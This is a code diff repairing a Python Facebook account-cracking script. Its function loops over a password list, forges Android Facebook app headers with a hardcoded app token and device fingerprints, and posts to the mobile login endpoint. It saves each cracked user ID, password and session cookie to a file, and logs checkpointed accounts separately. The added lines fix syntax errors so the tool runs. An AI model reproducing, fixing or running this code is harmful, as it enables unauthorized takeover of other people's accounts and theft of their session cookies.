@@ -790,117 +790,145 @@ def api1(ids,names,passlist):
         except Exception as e:
                 pass
 def rndm(ids,passlist):
-        global loop
-        global oks
-        sys.stdout.write('\r\r\033[1;37m [TM_BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
-        try:
-                        for pas in passlist:
-                        accessToken = ['3506855|62f8ce9f74b12f84c123cc23437a4a32',
-'438142079|fc0a7caa49b192f64f6f5a6d9643bb28fb991c1bde5662','1479723375646806|afb3e4a6d8b868314cc843c21eebc6ae']
-                        fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
-                        fbbv = str(random.randint(111111111,999999999))
-                        android_version = device['android_version']
-                        model = device['model']
-                        build = device['build']
-                        fblc = device['fblc']
-                        fbcr = sim_id
-                        fbmf = device['fbmf']
-                        fbbd = device['fbbd']
-                        fbdv = device['fbdv']
-                        fbsv = device['fbsv']
-                        fbca = device['fbca']
-                        fbdm = device['fbdm']
-                        fbfw = '1'
-                        fbrv = '0'
-                        fban = 'FB4A'
-                        fbpn = 'com.facebook.katana'
-                        ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/530.0.0.48.74;FBBV/789633439;FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
-                        ###ua = SIM1()
-                        random_seed = random.Random()
-                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
-                        device_id = str(uuid.uuid4())
-                        secure = str(uuid.uuid4())
-                        family = str(uuid.uuid4())
-                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
-                        xd =str(''.join(random_seed.choices(string.digits, k=20)))
-                        sim_serials = f'["{xd}"]'
-                        li = ['28','29','210']
-                        li2 = random.choice(li)
-                        j1 = ''.join(random.choice(string.digits) for _ in range(2))
-                        jazoest = li2+j1
-                        data = {
-                                'adid':adid,
-                                'format':'json',
-                                'device_id':device_id,
-                                'email':ids,
-                                'password':pas,
-                                "logged_out_id": str(uuid.uuid4()),
-                                "hash_id": str(uuid.uuid4()),
-                                "reg_instance": str(uuid.uuid4()),
-                                "session_id": str(uuid.uuid4()),
-                                "advertiser_id": str(uuid.uuid4()),
-                                'generate_analytics_claims':'1',
-                                'credentials_type':'password',
-                                'source':'login',
-                                "sim_country": "id",
-                                "network_country": "id",
-                                "relative_url": "method/auth.login",
-                                'error_detail_type':'button_with_disabled',
-                                'enroll_misauth':'false',
-                                'generate_session_cookies':'1',
-                                'generate_machine_id':'1',
-                                'fb_api_req_friendly_name':'authenticate',
-                                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
-                        }
-                        headers={
-                                'Authorization':f'OAuth {accessToken}',
-                                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
-                                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
-                                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
-                                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
-                                'X-FB-Friendly-Name':'authenticate',
-                                'X-FB-Connection-Type':'unknown',
-                                'User-Agent': '[FBAN/FB4A;FBAV/270.0.0.57.127;FBBV/214125792;FBDM/{density=2.625,width=1080,height=2094};FBLC/en_US;FBRV/214902642;FBCR/Verizon ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G955U;FBSV/9;FBOP/1;FBCA/arm64-v8a:;]',
-                                'Accept-Encoding':'gzip, deflate',
-                                'Content-Type': 'application/x-www-form-urlencoded',
-                                'X-FB-HTTP-Engine': 'Liger'
-                                }
-                        url = 'https://b-graph.facebook.com/auth/login'
-                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
-                        po = requests.post(url,data=data,headers=headers).json()
-                        if 'session_key' in po:
-                                try:
-                                        uid = po['uid']
-                                except:
-                                        uid = ids
-                                if str(uid) in oks:
-                                        break
-                                else:
-                                        print('\r\r\033[1;32m [TM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
-                                        ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
-                                        print(f'\r\r\x1b[38;5;46m|COOKIE|-> {cookie} ')
-                                        open('/sdcard/TM-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
-                                        oks.append(str(uid))
-                                        break
-                        elif 'www.facebook.com' in po['error']['message']:
-                                try:
-                                        uid = po['error']['error_data']['uid']
-                                e
-                                        uid = 
-                                        print(f'\r\r\033[1;96m[TM-CP] '+str(uid)+' | '+pas+'\033[1;96m')
-                                        open('/sdcard/TM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
-                                        cps.append(str(ids))
-                                        break
-                        else:continue
-                loop+=1
-        except Exception as e:
-                pass
+    global loop
+    global oks
+    # Agar cps variable upar define nahi hai to error na aye
+    try:
+        global cps
+    except:
+        pass
+        
+    sys.stdout.write('\r\r\033[1;37m [TM_BRAND] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
+    
+    try:
+        # FIX: Loop syntax sahi kar diya hai
+        for pas in passlist:
+            accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
+            
+            fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
+            fbbv = str(random.randint(111111111,999999999))
+            
+            # Agar device dictionary upar define nahi hui to script crash na ho isliye try-except lagaya hai
+            try:
+                android_version = device['android_version']
+                model = device['model']
+                build = device['build']
+                fblc = device['fblc']
+                fbmf = device['fbmf']
+                fbbd = device['fbbd']
+                fbdv = device['fbdv']
+                fbsv = device['fbsv']
+                fbca = device['fbca']
+                fbdm = device['fbdm']
+            except:
+                # Fallback values agar device define na ho
+                android_version = '14'
+                model = 'Redmi Note 13'
+                build = 'UKQ1.230917.001'
+                fblc = 'en_US'
+                fbmf = 'Xiaomi'
+                fbbd = 'redmi'
+                fbdv = '2312DRA50G'
+                fbsv = '14'
+                fbca = 'arm64-v8a'
+                fbdm = '{density=3.0,width=1220,height=2712}'
+            
+            try:
+                fbcr = sim_id
+            except:
+                fbcr = 'Jazz'
 
-try:
-
-    app()
-except requests.exceptions.ConnectionError:
-        print('\n No internet connection ...')
-        exit()
-except Exception as e:
-    print(e)
+            fbfw = '1'
+            fbrv = '0'
+            fban = 'FB4A'
+            fbpn = 'com.facebook.katana'
+            
+            ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/530.0.0.48.74;FBBV/789633439;FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
+            
+            random_seed = random.Random()
+            adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
+            device_id = str(uuid.uuid4())
+            secure = str(uuid.uuid4())
+            family = str(uuid.uuid4())
+            
+            xd =str(''.join(random_seed.choices(string.digits, k=20)))
+            sim_serials = f'["{xd}"]'
+            li = ['28','29','210']
+            li2 = random.choice(li)
+            j1 = ''.join(random.choice(string.digits) for _ in range(2))
+            jazoest = li2+j1
+            
+            data = {
+                'adid':adid,
+                'format':'json',
+                'device_id':device_id,
+                'email':ids,
+                'password':pas,
+                "logged_out_id": str(uuid.uuid4()),
+                "hash_id": str(uuid.uuid4()),
+                "reg_instance": str(uuid.uuid4()),
+                "session_id": str(uuid.uuid4()),
+                "advertiser_id": str(uuid.uuid4()),
+                'generate_analytics_claims':'1',
+                'credentials_type':'password',
+                'source':'login',
+                "sim_country": "id",
+                "network_country": "id",
+                "relative_url": "method/auth.login",
+                'error_detail_type':'button_with_disabled',
+                'enroll_misauth':'false',
+                'generate_session_cookies':'1',
+                'generate_machine_id':'1',
+                'fb_api_req_friendly_name':'authenticate',
+                "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
+            }
+            
+            headers={
+                'Authorization':f'OAuth {accessToken}',
+                "X-FB-Connection-Type": "mobile.CTRadioAccessTechnologyLTE",
+                "X-FB-Connection-Bandwidth": str(random.randint(20000000, 30000000)),
+                "X-FB-Net-HNI": str(random.randint(20000, 40000)),
+                "X-FB-SIM-HNI": str(random.randint(20000, 40000)),
+                'X-FB-Friendly-Name':'authenticate',
+                'User-Agent': ua,
+                'Accept-Encoding':'gzip, deflate',
+                'Content-Type': 'application/x-www-form-urlencoded',
+                'X-FB-HTTP-Engine': 'Liger'
+            }
+            
+            url = 'https://b-graph.facebook.com/auth/login'
+            po = requests.post(url,data=data,headers=headers).json()
+            
+            if 'session_key' in po:
+                uid = po.get('uid', ids)
+                if str(uid) in oks:
+                    break
+                else:
+                    print('\r\r\033[1;32m [TM-OK] '+str(uid)+' | '+pas+'\033[1;97m')
+                    ckkk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
+                    ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
+                    cookie = f"sb={ssbb};{ckkk}"
+                    print(f'\r\r\x1b[38;5;46m|COOKIE|-> {cookie} ')
+                    open('/sdcard/TM-OK.txt','a').write(str(uid)+'|'+pas+'|'+cookie+'\n')
+                    oks.append(str(uid))
+                    break
+            
+            # FIX: Checkpoint wali line par SyntaxError tha, ab theek hai
+            elif 'www.facebook.com' in po.get('error', {}).get('message', ''):
+                try:
+                    uid = po['error']['error_data']['uid']
+                except:
+                    uid = ids
+                
+                print(f'\r\r\033[1;96m[TM-CP] '+str(uid)+' | '+pas+'\033[1;96m')
+                open('/sdcard/TM-CP.txt','a').write(str(uid)+'|'+pas+'\n')
+                try:
+                    cps.append(str(ids))
+                except:
+                    pass
+                break
+            else:
+                continue
+        loop+=1
+    except Exception as e:
+        pass        
